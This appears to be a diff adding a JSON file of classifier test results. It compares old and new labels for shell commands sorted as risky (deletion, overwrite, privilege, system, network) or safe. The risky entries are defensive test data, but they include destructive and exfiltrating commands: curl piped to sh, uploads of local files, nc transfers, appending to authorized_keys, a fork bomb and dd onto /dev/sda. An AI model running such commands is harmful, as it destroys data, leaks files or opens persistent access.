@@ -1,0 +1,1048 @@
+{
+ "old": {
+  "risky": [
+   [
+    "DEL",
+    "rm var.txt",
+    "file deletion (rm)"
+   ],
+   [
+    "DEL",
+    "rm -rf bos",
+    "recursive or forced deletion (rm -r/-f)"
+   ],
+   [
+    "DEL",
+    "unlink var.txt",
+    ""
+   ],
+   [
+    "DEL",
+    "find . -name '*.txt' -delete",
+    "mass file deletion (find -delete)"
+   ],
+   [
+    "DEL",
+    "find . -type f -exec rm {} +",
+    "mass file deletion (find -delete)"
+   ],
+   [
+    "DEL",
+    "find . -name '*.log' | xargs rm",
+    ""
+   ],
+   [
+    "DEL",
+    "ls *.tmp | xargs -n1 rm -f",
+    ""
+   ],
+   [
+    "DEL",
+    "shred -u var.txt",
+    "disk or data destruction (dd/mkfs/shred)"
+   ],
+   [
+    "DEL",
+    "rsync -a --delete kaynak/ hedef/",
+    ""
+   ],
+   [
+    "DEL",
+    "git clean -fdx",
+    "irreversible git operation"
+   ],
+   [
+    "DEL",
+    "env rm -rf bos",
+    ""
+   ],
+   [
+    "DEL",
+    "nohup rm var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "echo x > var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "sort var.txt > var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "cp yeni.txt var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "mv yeni.txt var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "cp yeni/var.txt belgeler/",
+    ""
+   ],
+   [
+    "OVW",
+    "ln -sf yeni.txt var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "echo x | tee var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "sed -i 's/a/b/' var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "perl -pi -e 's/a/b/' var.txt",
+    ""
+   ],
+   [
+    "OVW",
+    "truncate -s 0 var.txt",
+    "erasing file contents (truncate)"
+   ],
+   [
+    "OVW",
+    "git reset --hard HEAD~1",
+    "irreversible git operation"
+   ],
+   [
+    "OVW",
+    "git checkout -- .",
+    ""
+   ],
+   [
+    "OVW",
+    "git push --force origin main",
+    "irreversible git operation"
+   ],
+   [
+    "OVW",
+    "curl -o var.txt https://example.com/x",
+    ""
+   ],
+   [
+    "OVW",
+    "wget -O var.txt https://example.com/x",
+    ""
+   ],
+   [
+    "OVW",
+    "curl -o ~/.bashrc https://example.com/rc",
+    ""
+   ],
+   [
+    "OVW",
+    "echo alias ls=rm >> ~/.bashrc",
+    ""
+   ],
+   [
+    "PRIV",
+    "sudo apt install sl",
+    "running with administrator rights (sudo/su)"
+   ],
+   [
+    "PRIV",
+    "su -",
+    "running with administrator rights (sudo/su)"
+   ],
+   [
+    "PRIV",
+    "chmod -R 755 .",
+    "recursive permission/ownership change"
+   ],
+   [
+    "PRIV",
+    "chmod 777 bos",
+    "recursive permission/ownership change"
+   ],
+   [
+    "PRIV",
+    "chmod u+s betik",
+    ""
+   ],
+   [
+    "PRIV",
+    "chmod 4755 betik",
+    ""
+   ],
+   [
+    "PRIV",
+    "chown -R kullanici .",
+    "recursive permission/ownership change"
+   ],
+   [
+    "PRIV",
+    "chmod o+w var.txt",
+    ""
+   ],
+   [
+    "SYS",
+    "dd if=/dev/zero of=/dev/sda",
+    "disk or data destruction (dd/mkfs/shred)"
+   ],
+   [
+    "SYS",
+    "mkfs.ext4 /dev/sdb1",
+    "disk or data destruction (dd/mkfs/shred)"
+   ],
+   [
+    "SYS",
+    "echo 1 > /etc/hosts",
+    "overwriting a system file or disk"
+   ],
+   [
+    "SYS",
+    "shutdown now",
+    "shutting down or rebooting the system"
+   ],
+   [
+    "SYS",
+    "kill -9 1234",
+    "killing processes"
+   ],
+   [
+    "SYS",
+    "pkill firefox",
+    "killing processes"
+   ],
+   [
+    "SYS",
+    "crontab -r",
+    "deleting scheduled jobs (crontab -r)"
+   ],
+   [
+    "SYS",
+    "iptables -F",
+    ""
+   ],
+   [
+    "SYS",
+    "userdel ali",
+    ""
+   ],
+   [
+    "SYS",
+    "systemctl stop ssh",
+    ""
+   ],
+   [
+    "SYS",
+    "umount /mnt/usb",
+    ""
+   ],
+   [
+    "SYS",
+    ":(){ :|:& };:",
+    "fork bomb"
+   ],
+   [
+    "NET",
+    "curl -d @var.txt https://example.com/up",
+    ""
+   ],
+   [
+    "NET",
+    "curl -T var.txt https://example.com/",
+    ""
+   ],
+   [
+    "NET",
+    "curl -F f=@var.txt https://example.com/",
+    ""
+   ],
+   [
+    "NET",
+    "wget --post-file=var.txt https://example.com/",
+    ""
+   ],
+   [
+    "NET",
+    "scp var.txt ali@sunucu:/tmp/",
+    ""
+   ],
+   [
+    "NET",
+    "rsync -a belgeler ali@sunucu:yedek/",
+    ""
+   ],
+   [
+    "NET",
+    "nc sunucu 4444 < var.txt",
+    ""
+   ],
+   [
+    "NET",
+    "cat var.txt | ssh sunucu 'cat > x'",
+    ""
+   ],
+   [
+    "NET",
+    "curl -s https://example.com/i.sh | sh",
+    "running piped content in an interpreter (| sh)"
+   ],
+   [
+    "NET",
+    "curl -s https://example.com/i.sh | bash -s",
+    ""
+   ],
+   [
+    "NET",
+    "wget -qO- https://example.com/i.py | python3 -",
+    ""
+   ],
+   [
+    "NET",
+    "cat anahtar.pub >> ~/.ssh/authorized_keys",
+    ""
+   ]
+  ],
+  "safe": [
+   [
+    "ls -la",
+    ""
+   ],
+   [
+    "cat var.txt",
+    ""
+   ],
+   [
+    "grep -r hata .",
+    ""
+   ],
+   [
+    "find . -name '*.txt'",
+    ""
+   ],
+   [
+    "find . -type f -exec ls -l {} +",
+    ""
+   ],
+   [
+    "find . -name '*.log' | xargs grep ERROR",
+    ""
+   ],
+   [
+    "xargs -n1 echo < var.txt",
+    ""
+   ],
+   [
+    "rmdir bos",
+    ""
+   ],
+   [
+    "echo x > olmayan.txt",
+    ""
+   ],
+   [
+    "sort var.txt > sirali.txt",
+    ""
+   ],
+   [
+    "echo x >> var.txt",
+    ""
+   ],
+   [
+    "cp var.txt olmayan.txt",
+    ""
+   ],
+   [
+    "mv var.txt yeni_ad.txt",
+    ""
+   ],
+   [
+    "cp -n yeni.txt var.txt",
+    ""
+   ],
+   [
+    "cp -r belgeler belgeler_yedek",
+    ""
+   ],
+   [
+    "ln -s var.txt kisayol",
+    ""
+   ],
+   [
+    "echo x | tee -a var.txt",
+    ""
+   ],
+   [
+    "echo x | tee olmayan.txt",
+    ""
+   ],
+   [
+    "sed -n '2p' var.txt",
+    ""
+   ],
+   [
+    "sed 's/a/b/' var.txt",
+    ""
+   ],
+   [
+    "perl -ne 'print' var.txt",
+    ""
+   ],
+   [
+    "git status",
+    ""
+   ],
+   [
+    "git log --oneline",
+    ""
+   ],
+   [
+    "git clean -n",
+    ""
+   ],
+   [
+    "git checkout main",
+    ""
+   ],
+   [
+    "git push origin main",
+    ""
+   ],
+   [
+    "curl -o sayfa.html https://example.com",
+    ""
+   ],
+   [
+    "wget https://example.com/dosya.zip",
+    ""
+   ],
+   [
+    "curl -d 'a=1' https://example.com/api",
+    ""
+   ],
+   [
+    "scp ali@sunucu:/tmp/x.txt .",
+    ""
+   ],
+   [
+    "rsync -a belgeler/ yedek/",
+    ""
+   ],
+   [
+    "chmod +x betik.sh",
+    ""
+   ],
+   [
+    "chmod 644 var.txt",
+    ""
+   ],
+   [
+    "chmod 755 betik.sh",
+    ""
+   ],
+   [
+    "chown kullanici var.txt",
+    ""
+   ],
+   [
+    "ssh sunucu uptime",
+    ""
+   ],
+   [
+    "python3 betik.py",
+    ""
+   ],
+   [
+    "cat betik.py | python3 kontrol.py",
+    ""
+   ],
+   [
+    "dd if=var.txt of=/dev/null",
+    "disk or data destruction (dd/mkfs/shred)"
+   ],
+   [
+    "echo hata > /dev/null",
+    ""
+   ],
+   [
+    "ps aux",
+    ""
+   ],
+   [
+    "df -h",
+    ""
+   ],
+   [
+    "mount",
+    ""
+   ],
+   [
+    "systemctl status ssh",
+    ""
+   ],
+   [
+    "crontab -l",
+    ""
+   ],
+   [
+    "iptables -L",
+    ""
+   ],
+   [
+    "tar -czf arsiv.tar.gz belgeler",
+    ""
+   ],
+   [
+    "env",
+    ""
+   ],
+   [
+    "time ls",
+    ""
+   ],
+   [
+    "tee < var.txt",
+    ""
+   ],
+   [
+    "mkdir -p a/b/c",
+    ""
+   ],
+   [
+    "touch yeni.txt",
+    ""
+   ],
+   [
+    "du -sh .",
+    ""
+   ]
+  ]
+ },
+ "new": {
+  "risky": [
+   [
+    "DEL",
+    "rm var.txt",
+    "file deletion (rm)"
+   ],
+   [
+    "DEL",
+    "rm -rf bos",
+    "recursive or forced deletion (rm -r/-f)"
+   ],
+   [
+    "DEL",
+    "unlink var.txt",
+    "deleting or shredding files"
+   ],
+   [
+    "DEL",
+    "find . -name '*.txt' -delete",
+    "mass file deletion (find -delete)"
+   ],
+   [
+    "DEL",
+    "find . -type f -exec rm {} +",
+    "mass file deletion or modification (find -exec)"
+   ],
+   [
+    "DEL",
+    "find . -name '*.log' | xargs rm",
+    "file deletion (rm)"
+   ],
+   [
+    "DEL",
+    "ls *.tmp | xargs -n1 rm -f",
+    "recursive or forced deletion (rm -r/-f)"
+   ],
+   [
+    "DEL",
+    "shred -u var.txt",
+    "deleting or shredding files"
+   ],
+   [
+    "DEL",
+    "rsync -a --delete kaynak/ hedef/",
+    "deleting files while syncing (rsync --delete)"
+   ],
+   [
+    "DEL",
+    "git clean -fdx",
+    "irreversible git operation"
+   ],
+   [
+    "DEL",
+    "env rm -rf bos",
+    "recursive or forced deletion (rm -r/-f)"
+   ],
+   [
+    "DEL",
+    "nohup rm var.txt",
+    "file deletion (rm)"
+   ],
+   [
+    "OVW",
+    "echo x > var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "sort var.txt > var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "cp yeni.txt var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "mv yeni.txt var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "cp yeni/var.txt belgeler/",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "ln -sf yeni.txt var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "echo x | tee var.txt",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "sed -i 's/a/b/' var.txt",
+    "editing a file in place (sed -i)"
+   ],
+   [
+    "OVW",
+    "perl -pi -e 's/a/b/' var.txt",
+    "editing a file in place (perl -i)"
+   ],
+   [
+    "OVW",
+    "truncate -s 0 var.txt",
+    "erasing file contents (truncate)"
+   ],
+   [
+    "OVW",
+    "git reset --hard HEAD~1",
+    "irreversible git operation"
+   ],
+   [
+    "OVW",
+    "git checkout -- .",
+    "irreversible git operation"
+   ],
+   [
+    "OVW",
+    "git push --force origin main",
+    "irreversible git operation"
+   ],
+   [
+    "OVW",
+    "curl -o var.txt https://example.com/x",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "wget -O var.txt https://example.com/x",
+    "overwriting an existing file"
+   ],
+   [
+    "OVW",
+    "curl -o ~/.bashrc https://example.com/rc",
+    "changing a start-up or configuration file"
+   ],
+   [
+    "OVW",
+    "echo alias ls=rm >> ~/.bashrc",
+    "changing a start-up or configuration file"
+   ],
+   [
+    "PRIV",
+    "sudo apt install sl",
+    "running with administrator rights (sudo/su)"
+   ],
+   [
+    "PRIV",
+    "su -",
+    "running with administrator rights (sudo/su)"
+   ],
+   [
+    "PRIV",
+    "chmod -R 755 .",
+    "recursive permission/ownership change"
+   ],
+   [
+    "PRIV",
+    "chmod 777 bos",
+    "granting world-write or setuid permission"
+   ],
+   [
+    "PRIV",
+    "chmod u+s betik",
+    "granting world-write or setuid permission"
+   ],
+   [
+    "PRIV",
+    "chmod 4755 betik",
+    "granting world-write or setuid permission"
+   ],
+   [
+    "PRIV",
+    "chown -R kullanici .",
+    "recursive permission/ownership change"
+   ],
+   [
+    "PRIV",
+    "chmod o+w var.txt",
+    "granting world-write or setuid permission"
+   ],
+   [
+    "SYS",
+    "dd if=/dev/zero of=/dev/sda",
+    "disk or file-system operation (dd/mkfs/mount)"
+   ],
+   [
+    "SYS",
+    "mkfs.ext4 /dev/sdb1",
+    "disk or file-system operation (dd/mkfs/mount)"
+   ],
+   [
+    "SYS",
+    "echo 1 > /etc/hosts",
+    "overwriting a system file or disk"
+   ],
+   [
+    "SYS",
+    "shutdown now",
+    "shutting down or rebooting the system"
+   ],
+   [
+    "SYS",
+    "kill -9 1234",
+    "killing processes"
+   ],
+   [
+    "SYS",
+    "pkill firefox",
+    "killing processes"
+   ],
+   [
+    "SYS",
+    "crontab -r",
+    "deleting scheduled jobs (crontab -r)"
+   ],
+   [
+    "SYS",
+    "iptables -F",
+    "flushing firewall rules"
+   ],
+   [
+    "SYS",
+    "userdel ali",
+    "changing accounts, the kernel or system settings"
+   ],
+   [
+    "SYS",
+    "systemctl stop ssh",
+    "stopping a service or shutting down the system"
+   ],
+   [
+    "SYS",
+    "umount /mnt/usb",
+    "disk or file-system operation (dd/mkfs/mount)"
+   ],
+   [
+    "SYS",
+    ":(){ :|:& };:",
+    "fork bomb"
+   ],
+   [
+    "NET",
+    "curl -d @var.txt https://example.com/up",
+    "sending a local file over the network"
+   ],
+   [
+    "NET",
+    "curl -T var.txt https://example.com/",
+    "sending a local file over the network"
+   ],
+   [
+    "NET",
+    "curl -F f=@var.txt https://example.com/",
+    "sending a local file over the network"
+   ],
+   [
+    "NET",
+    "wget --post-file=var.txt https://example.com/",
+    "sending a local file over the network"
+   ],
+   [
+    "NET",
+    "scp var.txt ali@sunucu:/tmp/",
+    "sending local files to a remote host"
+   ],
+   [
+    "NET",
+    "rsync -a belgeler ali@sunucu:yedek/",
+    "sending local files to a remote host"
+   ],
+   [
+    "NET",
+    "nc sunucu 4444 < var.txt",
+    "transferring data over a network connection (nc)"
+   ],
+   [
+    "NET",
+    "cat var.txt | ssh sunucu 'cat > x'",
+    "sending local data to a remote host (| ssh)"
+   ],
+   [
+    "NET",
+    "curl -s https://example.com/i.sh | sh",
+    "running piped content in an interpreter (| sh)"
+   ],
+   [
+    "NET",
+    "curl -s https://example.com/i.sh | bash -s",
+    "running piped content in an interpreter (| sh)"
+   ],
+   [
+    "NET",
+    "wget -qO- https://example.com/i.py | python3 -",
+    "running piped content in an interpreter (| sh)"
+   ],
+   [
+    "NET",
+    "cat anahtar.pub >> ~/.ssh/authorized_keys",
+    "changing SSH keys or settings"
+   ]
+  ],
+  "safe": [
+   [
+    "ls -la",
+    ""
+   ],
+   [
+    "cat var.txt",
+    ""
+   ],
+   [
+    "grep -r hata .",
+    ""
+   ],
+   [
+    "find . -name '*.txt'",
+    ""
+   ],
+   [
+    "find . -type f -exec ls -l {} +",
+    ""
+   ],
+   [
+    "find . -name '*.log' | xargs grep ERROR",
+    ""
+   ],
+   [
+    "xargs -n1 echo < var.txt",
+    ""
+   ],
+   [
+    "rmdir bos",
+    ""
+   ],
+   [
+    "echo x > olmayan.txt",
+    ""
+   ],
+   [
+    "sort var.txt > sirali.txt",
+    ""
+   ],
+   [
+    "echo x >> var.txt",
+    ""
+   ],
+   [
+    "cp var.txt olmayan.txt",
+    ""
+   ],
+   [
+    "mv var.txt yeni_ad.txt",
+    ""
+   ],
+   [
+    "cp -n yeni.txt var.txt",
+    ""
+   ],
+   [
+    "cp -r belgeler belgeler_yedek",
+    ""
+   ],
+   [
+    "ln -s var.txt kisayol",
+    ""
+   ],
+   [
+    "echo x | tee -a var.txt",
+    ""
+   ],
+   [
+    "echo x | tee olmayan.txt",
+    ""
+   ],
+   [
+    "sed -n '2p' var.txt",
+    ""
+   ],
+   [
+    "sed 's/a/b/' var.txt",
+    ""
+   ],
+   [
+    "perl -ne 'print' var.txt",
+    ""
+   ],
+   [
+    "git status",
+    ""
+   ],
+   [
+    "git log --oneline",
+    ""
+   ],
+   [
+    "git clean -n",
+    ""
+   ],
+   [
+    "git checkout main",
+    ""
+   ],
+   [
+    "git push origin main",
+    ""
+   ],
+   [
+    "curl -o sayfa.html https://example.com",
+    ""
+   ],
+   [
+    "wget https://example.com/dosya.zip",
+    ""
+   ],
+   [
+    "curl -d 'a=1' https://example.com/api",
+    ""
+   ],
+   [
+    "scp ali@sunucu:/tmp/x.txt .",
+    ""
+   ],
+   [
+    "rsync -a belgeler/ yedek/",
+    ""
+   ],
+   [
+    "chmod +x betik.sh",
+    ""
+   ],
+   [
+    "chmod 644 var.txt",
+    ""
+   ],
+   [
+    "chmod 755 betik.sh",
+    ""
+   ],
+   [
+    "chown kullanici var.txt",
+    ""
+   ],
+   [
+    "ssh sunucu uptime",
+    ""
+   ],
+   [
+    "python3 betik.py",
+    ""
+   ],
+   [
+    "cat betik.py | python3 kontrol.py",
+    ""
+   ],
+   [
+    "dd if=var.txt of=/dev/null",
+    ""
+   ],
+   [
+    "echo hata > /dev/null",
+    ""
+   ],
+   [
+    "ps aux",
+    ""
+   ],
+   [
+    "df -h",
+    ""
+   ],
+   [
+    "mount",
+    ""
+   ],
+   [
+    "systemctl status ssh",
+    ""
+   ],
+   [
+    "crontab -l",
+    ""
+   ],
+   [
+    "iptables -L",
+    ""
+   ],
+   [
+    "tar -czf arsiv.tar.gz belgeler",
+    ""
+   ],
+   [
+    "env",
+    ""
+   ],
+   [
+    "time ls",
+    ""
+   ],
+   [
+    "tee < var.txt",
+    ""
+   ],
+   [
+    "mkdir -p a/b/c",
+    ""
+   ],
+   [
+    "touch yeni.txt",
+    ""
+   ],
+   [
+    "du -sh .",
+    ""
+   ]
+  ]
+ }
+}
